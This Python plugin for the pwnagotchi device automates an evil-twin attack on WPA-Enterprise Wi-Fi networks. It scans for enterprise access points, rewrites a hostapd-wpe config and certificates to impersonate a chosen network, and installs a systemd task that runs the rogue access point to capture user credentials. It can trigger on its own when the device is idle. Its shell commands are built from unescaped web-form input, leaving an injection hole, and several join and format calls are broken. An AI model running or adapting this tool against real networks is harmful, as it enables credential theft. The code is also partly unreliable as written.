# Heavily based on Switcher and WebConfig Plugins

import os
import logging
import json
import re
from pwnagotchi import plugins
from pwnagotchi import reboot
from flask import abort
from flask import render_template_string

DIRECTORY_HOSTAPD = "/etc/hostapd-wpe"

def systemctl(command, unit=None):
    if unit:
        os.system("/bin/systemctl %s %s" % (command, unit))
    else:
        os.system("/bin/systemctl %s" % command)

def systemd_dropin(name, content):
    if not name.endswith('.service'):
        name = '%s.service' % name

    dropin_dir = "/etc/systemd/system/%s.d/" % name
    os.makedirs(dropin_dir, exist_ok=True)

    with open(os.path.join(dropin_dir, "enterprise.conf"), "wt") as dropin:
        dropin.write(content)

    systemctl("daemon-reload")

def create_service(task_service_name):
    # here we create the service which runs the tasks
    with open('/etc/systemd/system/%s' % task_service_name, 'wt') as task_service:
        task_service.write("\n".join(
            "[Unit]",
            "Description=Executes the tasks of the pwnagotchi enterprise plugin",
            "After=pwnagotchi.service bettercap.service",
            "",
            "[Service]",
            "Type=oneshot",
            "RemainAfterExit=yes",
            "ExecStart=-/usr/local/bin/enterprise.sh",
            "ExecStart=-/bin/rm /etc/systemd/system/%s".format(task_service_name),
            "ExecStart=-/bin/rm /usr/local/bin/enterprise.sh",
            "",
            "[Install]",
            "WantedBy=multi-user.target"
        ))

def create_reboot_timer(timeout):
    with open('/etc/systemd/system/enterprise-reboot.timer', 'wt') as reboot_timer:
        reboot_timer.write("\n".join(
            "[Unit]",
            "Description=Reboot when time is up",
            "ConditionPathExists=/root/.enterprise",
            "",
            "[Timer]",
            "OnBootSec=%sm".format(timeout),
            "Unit=reboot.target"
            "",
            "[Install]",
            "WantedBy=timers.target"
        ))

def create_command(script_path, commands):
    with open(script_path, 'wt') as script_file:
        script_file.write('#!/bin/bash\n')
        for cmd in commands:
            script_file.write('%s\n' % cmd)

def add_task(options):
    task_service_name = "enterprise-task.service"

    # save all the commands to a shell script
    script_dir = '/usr/local/bin/'
    script_path = os.path.join(script_dir, 'enterprise.sh')
    os.makedirs(script_dir, exist_ok=True)

    create_command(script_path, options['commands'])

    os.system("chmod a+x %s" % script_path)

    create_service(task_service_name)

    # create a indication file!
    # if this file is set, we want the enterprise-tasks to run
    open('/root/.enterprise', 'a').close()

    # add condition
    systemd_dropin("pwnagotchi.service", "\n".join(
        "[Unit]",
        "ConditionPathExists=!/root/.enterprise"
    ))

    systemd_dropin("bettercap.service", "\n".join(
        "[Unit]",
        "ConditionPathExists=!/root/.enterprise"
    ))

    systemd_dropin(task_service_name, "\n".join(
        "[Service]",
        "ExecStart=-/bin/rm /root/.enterprise",
        "ExecStart=-/bin/rm /etc/systemd/system/enterprise-reboot.timer"
    ))

    create_reboot_timer(options['timeout'])

    systemctl("daemon-reload")
    systemctl("enable", "enterprise-reboot.timer")
    systemctl("enable", task_service_name)
    reboot()

def update_hostapd_config(interface, config, password):
    confFilepath = "{0}/hostapd-wpe.conf".format(DIRECTORY_HOSTAPD)

    # Update hostapd-wpe configuration
    os.system("sed -i 's/^\(private_key_passwd=\).*$/\\1{1}/' {0}".format(confFilepath, password))
    os.system("sed -i 's/^\(wpa_key_mgmt=\).*$/\\1{1}/' {0}".format(confFilepath, "WPA-EAP"))
    os.system("sed -i 's/^\(interface=\).*$/\\1{1}/' {0}".format(confFilepath, interface))
    os.system("sed -i 's/^\(ssid=\).*$/\\1{1}/' {0}".format(confFilepath, config["ssid"]))
    os.system("sed -i 's/^\(channel=\).*$/\\1{1}/' {0}".format(confFilepath, config["channel"]))
    os.system("sed -i 's/^\(wpa_pairwise=\).*$/\\1{1}/' {0}".format(confFilepath, config["cipher"]))
    os.system("sed -i 's/^\(rsn_pairwise=\).*$/\\1{1}/' {0}".format(confFilepath, config["cipher"]))
    mode = "a"
    if int(config["channel"]) <= 14:
        mode = "g"
    os.system("sed -i 's/^\(hw_mode=\).*$/\\1{1}/' {0}".format(confFilepath, mode))
    # Get last digit(s) from enc method
    os.system("sed -i 's/^\(wpa=\).*$/\\1{1}/' {0}".format(confFilepath, re.sub('.*?([0-9]*)$',r'\1', config["enc"])))
    # May need to find commented out line also if first run
    os.system("sed -i 's/^#*\(bssid=\).*$/\\1{1}/' {0}".format(confFilepath, config["bssid"]))
    # May need to find commented out line also if first run
    os.system("sed -i 's/^#*\(country_code=\).*$/\\1{1}/' {0}".format(confFilepath, config["certificate"]["country"]))

def generate_certificates(config, password):
    
    caFilepath = "{0}/certs/ca.cnf".format(DIRECTORY_HOSTAPD)
    serverFilepath = "{0}/certs/server.cnf".format(DIRECTORY_HOSTAPD)

    # Update CA Certificate
    os.system("sed -i '/\[req\]/,/^\[/ s/^\(input_password=\).*$/\\1{1}/' {0}".format(caFilepath, password))
    os.system("sed -i '/\[req\]/,/^\[/ s/^\(output_password=\).*$/\\1{1}/' {0}".format(caFilepath, password))
    os.system("sed -i '/\[certificate_authority\]/,/^\[/ s/^\(countryName\s*=\).*$/\\1 {1}/' {0}".format(caFilepath, config["certificate"]["country"]))
    os.system("sed -i '/\[certificate_authority\]/,/^\[/ s/^\(stateOrProvinceName\s*=\).*$/\\1 {1}/' {0}".format(caFilepath, config["certificate"]["state"]))
    os.system("sed -i '/\[certificate_authority\]/,/^\[/ s/^\(localityName\s*=\).*$/\\1 {1}/' {0}".format(caFilepath, config["certificate"]["city"]))
    os.system("sed -i '/\[certificate_authority\]/,/^\[/ s/^\(organizationName\s*=\).*$/\\1 {1}/' {0}".format(caFilepath, config["certificate"]["organisation"]))
    os.system("sed -i '/\[certificate_authority\]/,/^\[/ s/^\(emailAddress\s*=\).*$/\\1 {1}/' {0}".format(caFilepath, config["certificate"]["email"]))
    os.system("sed -i '/\[certificate_authority\]/,/^\[/ s/^\(commonName\s*=\).*$/\\1 {1}/' {0}".format(caFilepath, config["certificate"]["commonName"]))

    # Update Server Certificate
    os.system("sed -i '/\[req\]/,/^\[/ s/^\(input_password=\).*$/\\1{1}/' {0}".format(serverFilepath, password))
    os.system("sed -i '/\[req\]/,/^\[/ s/^\(output_password=\).*$/\\1{1}/' {0}".format(serverFilepath, password))
    os.system("sed -i '/\[server\]/,/^\[/ s/^\(countryName\s*=\).*$/\\1 {1}/' {0}".format(serverFilepath, config["certificate"]["country"]))
    os.system("sed -i '/\[server\]/,/^\[/ s/^\(stateOrProvinceName\s*=\).*$/\\1 {1}/' {0}".format(serverFilepath, config["certificate"]["state"]))
    os.system("sed -i '/\[server\]/,/^\[/ s/^\(localityName\s*=\).*$/\\1 {1}/' {0}".format(serverFilepath, config["certificate"]["city"]))
    os.system("sed -i '/\[server\]/,/^\[/ s/^\(organizationName\s*=\).*$/\\1 {1}/' {0}".format(serverFilepath, config["certificate"]["organisation"]))
    os.system("sed -i '/\[server\]/,/^\[/ s/^\(emailAddress\s*=\).*$/\\1 {1}/' {0}".format(serverFilepath, config["certificate"]["email"]))
    os.system("sed -i '/\[server\]/,/^\[/ s/^\(commonName\s*=\).*$/\\1 {1}/' {0}".format(serverFilepath, config["certificate"]["commonName"]))

    # Generate certificates
    os.system("$(cd {0}/certs && make ca && make server)".format(DIRECTORY_HOSTAPD))

# def serializer(obj):
#     if isinstance(obj, set):
#         return list(obj)
#     raise TypeError

class Enterprise(plugins.Plugin):
    __author__ = '5461464+BradlySharpe@users.noreply.github.com'
    __version__ = '0.0.5'
    __name__ = 'enterprise'
    __license__ = 'GPL3'
    __description__ = 'This plugin will attempt to obtain credentials from enterprise networks when bored and networks are available.'

    def __init__(self):
        self.config = {
            "ssid": "",
            "bssid": "",
            "channel": 0,
            "enc": "",
            "cipher": "",
            "certificate": {
                "country": "",
                "state": "",
                "city": "",
                "organisation": "",
                "email": "",
                "commonName": ""
            },
            "enabled": False,
            "access_points": [],
        }
        self.rebooting = False
        self.ready = False
    
    def on_ready(self, agent):
        self.ready = True

    # called when the agent refreshed an unfiltered access point list
    # this list contains all access points that were detected BEFORE filtering
    def on_unfiltered_ap_list(self, agent, access_points):
        if access_points:
            self.config["access_points"] = []

            for ap in access_points:
                if (ap["encryption"] != "OPEN") and (ap["authentication"] != "PSK"):
                    self.config["access_points"].append(ap)

    def trigger(self, agent):
        try:
            if not self.ready:
                logging.info("[enterprise] trigger called but not ready")
                return

            if not self.config["enabled"]:
                logging.info("[enterprise] trigger called but not enabled")
                return

            interface = self.options["interface"]
            logging.info("[enterprise] interface set")
            privateKeyPassword="whatever" # default password in configuration

            self.rebooting = True 

            logging.info("[enterprise] Updating config")
            update_hostapd_config(interface, self.config, privateKeyPassword)

            logging.info("[enterprise] Generating certs")
            generate_certificates(self.config, privateKeyPassword)

            logging.info("[enterprise] Adding Task")
            add_task({
                "timeout": self.options["duration"],
                "commands": [
                    "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf"
                ]
            })

            logging.info("[enterprise] Finished triggering task")
        except Exception as ex:
            logging.error(ex)

        
    # called when the status is set to bored
    def on_bored(self, agent):
       self.trigger(agent)

    # called when the status is set to sad
    def on_sad(self, agent):
       self.trigger(agent)

    def on_loaded(self):
        logging.info("[enterprise] is loaded.")

    def on_ui_update(self, ui):
        if self.rebooting:
            ui.set('line1', "Off to capture WPA-E Creds")
            ui.set('line2', "SSID: %s" % self.config["ssid"])

    def on_webhook(self, path, request):
        if not self.ready:
            return "Plugin not ready"

        if request.method == "GET":
            if path == "/" or not path:
                return render_template_string(
                    INDEX,
                    title="Enterprise",
                    access_points=self.config["access_points"]
                )
            elif path == "get-config":
                return json.dumps(self.config) #, default=serializer)
            else:
                abort(404)
        elif request.method == "POST":
            if path == "update-task":
                try:
                    data = request.get_json()

                    self.config["bssid"] = data["bssid"]
                    self.config["ssid"] = data["ssid"]
                    self.config["channel"] = data["channel"]
                    self.config["enc"] = data["enc"]
                    self.config["cipher"] = data["cipher"]

                    cert = data["certificate"]
                    self.config["certificate"]["country"] = cert["country"]
                    self.config["certificate"]["state"] = cert["state"]
                    self.config["certificate"]["city"] = cert["city"]
                    self.config["certificate"]["organisation"] = cert["organisation"]
                    self.config["certificate"]["email"] = cert["email"]
                    self.config["certificate"]["commonName"] = cert["commonName"]

                    self.config["enabled"] = True

                    return "success"
                except Exception as ex:
                    logging.error(ex)
                    return "config error", 500
            elif path == "trigger-task":
                self.trigger(None)
                return "success"
            else:
                abort(404)
        abort(404)

INDEX = """
{% extends "base.html" %}
{% set active_page = "plugins" %}
{% block title %}
    {{ title }}
{% endblock %}

{% block styles %}
{{ super() }}
<style>
    #btnUpdate {
        width: 90%;
        margin: 5px 5% 0;
        background-color: #0061b0;
        border: none;
        color: white;
        padding: 15px 32px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 16px;
        cursor: pointer;
    }

    #btnSelect {
        background-color: #0061b0;
        border: none;
        color: white;
        padding: 15px 32px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 16px;
        cursor: pointer;
    }

    #content {
        width:100%;
        max-width:100%;
        overflow-x: scroll;
    }

    table {
        margin: 5px;
        table-layout: auto;
        width: 100%;
    }

    table, th, td {
      border: 1px solid black;
      border-collapse: collapse;
    }

    th, td {
      padding: 15px;
      text-align: left;
    }

    table tr:nth-child(even) {
      background-color: #eee;
    }

    table tr:nth-child(odd) {
     background-color: #fff;
    }

    table th {
      background-color: black;
      color: white;
    }

    @media screen and (max-width:700px) {
        
    }
</style>
{% endblock %}

{% block content %}
    <div data-role="collapsible" data-collapsed-icon="carat-d" data-expanded-icon="carat-u">
        <h4>Evil Twin</h4>
        <label for="bssid">BSSID:</label>
        <input type="text" id="bssid" name="bssid" value="" placeholder="00:11:22:33:44:55" />
        <label for="ssid">SSID:</label>
        <input type="text" id="ssid" name="ssid" value="" placeholder="SSID Name" />
        <label for="channel">Channel:</label>
        <input type="number" id="channel" name="channel" value="" />
        <label for="enc">Encryption:</label>
        <input type="text" id="enc" name="enc" value="" placeholder="WPA2" />
        <fieldset data-role="controlgroup">
            <legend>Cipher:</legend>
            <input type="radio" name="cipher" id="ccmp" value="CCMP">
            <label for="ccmp">CCMP</label>
            <input type="radio" name="cipher" id="tkip" value="TKIP">
            <label for="tkip">TKIP</label>
            <input type="radio" name="cipher" id="both" value="TKIP CCMP">
            <label for="both">TKIP + CCMP</label>
        </fieldset>
    </div>
    
    <div data-role="collapsible" data-collapsed-icon="carat-d" data-expanded-icon="carat-u">
        <h4>Certificate</h4>
        <label for="country">Country:</label>
        <input type="text" id="country" name="country" value="AU" placeholder="AU" />
        <label for="state">State:</label>
        <input type="text" id="state" name="state" value="Victoria" placeholder="Victoria" />
        <label for="city">City:</label>
        <input type="text" id="city" name="city" value="Melbourne" placeholder="Melbourne" />
        <label for="organisation">Organisation:</label>
        <input type="text" id="organisation" name="organisation" value="" placeholder="Organisation" />
        <label for="email">Email:</label>
        <input type="text" id="email" name="email" value="" placeholder="Email" />
        <label for="commonName">Common Name:</label>
        <input type="text" id="commonName" name="commonName" value="" placeholder="Common Name" />
    </div>
    <button id="btnUpdate" type="button" onclick="updateTask()">Update Task</button>
    <button id="btnTrigger" type="button" onclick="trigger()">Trigger Task</button>
    <hr />
    <div id="content">
        <table border="0" width="100%" cellspacing="0" cellpadding="0">
            <tr>
                <th></th>
                <th>BSSID</th>
                <th>SSID</th>
                <th>Ch</th>
                <th>Enc</th>
                <th>Cipher</th>
                <th>Auth</th>
                <th>Clients</th>
            </tr>
            {% for ap in access_points %}
                <tr>
                    <td>
                        <button 
                            class="btnSelect" 
                            type="button" 
                            onclick="set(
                                '{{ ap.mac }}', 
                                '{{ ap.hostname }}', 
                                '{{ ap.channel }}', 
                                '{{ ap.encryption }}', 
                                '{{ ap.cipher }}'
                            )"
                        >Select</button>
                    </td>
                    <td>{{ ap.mac }}</td>
                    <td>{{ ap.hostname }}</td>
                    <td>{{ ap.channel }}</td>
                    <td>{{ ap.encryption }}</td>
                    <td>{{ ap.cipher }}</td>
                    <td>{{ ap.authentication }}</td>
                    <td>{{ ap.clients | length }}</td>
                </tr>
            {% endfor %}
        </table>
    </div>
{% endblock %}

{% block script %}

        function getAndSet(id, value) {
            el = document.getElementById(id);
            if (el) el.value = value;
        }

        function set(mac, hostname, channel, enc, cipher) {
            getAndSet("bssid", mac);
            getAndSet("ssid", hostname);
            getAndSet("channel", channel);
            getAndSet("enc", enc);
            
            el = null;
            if (cipher.toUpperCase() === 'CCMP')
                el = document.getElementById('ccmp');
            else if (cipher.toUpperCase() === 'TKIP')
                el = document.getElementById('tkip');
            
            if (el)
                el.click();
        }

        function updateTask(){
            var config = {
                bssid: document.getElementById("bssid").value,
                ssid: document.getElementById("ssid").value,
                channel: document.getElementById("channel").value,
                enc: document.getElementById("enc").value,
                cipher: null,
                certificate: {
                    country: document.getElementById("country").value,
                    state: document.getElementById("state").value,
                    city: document.getElementById("city").value,
                    organisation: document.getElementById("organisation").value,
                    email: document.getElementById("email").value,
                    commonName: document.getElementById("commonName").value,
                }
            };

            if (document.getElementById("ccmp").checked)
                config.cipher = document.getElementById("ccmp").value
            else if (document.getElementById("tkip").checked)
                config.cipher = document.getElementById("tkip").value
            else if (document.getElementById("both").checked)
                config.cipher = document.getElementById("both").value

            
            sendJSON("enterprise/update-task", config, function(response) {
                if (response) {
                    if (response.status == "200") {
                        alert("Task updated");
                    } else {
                        alert("Error while updating the task (err-code: " + response.status + ")");
                    }
                }
            });
        }

        function trigger() {
            sendJSON("enterprise/trigger-task", {}, function(response) {
                if (response) {
                    if (response.status == "200") {
                        alert("Task triggered");
                    } else {
                        alert("Error while updating the task (err-code: " + response.status + ")");
                    }
                }
            });
        }
        
        function sendJSON(url, data, callback) {
          var xobj = new XMLHttpRequest();
          var csrf = "{{ csrf_token() }}";
          xobj.open('POST', url);
          xobj.setRequestHeader("Content-Type", "application/json");
          xobj.setRequestHeader('x-csrf-token', csrf);
          xobj.onreadystatechange = function () {
                if (xobj.readyState == 4) {
                  callback(xobj);
                }
          };
          xobj.send(JSON.stringify(data));
        }

{% endblock %}
"""
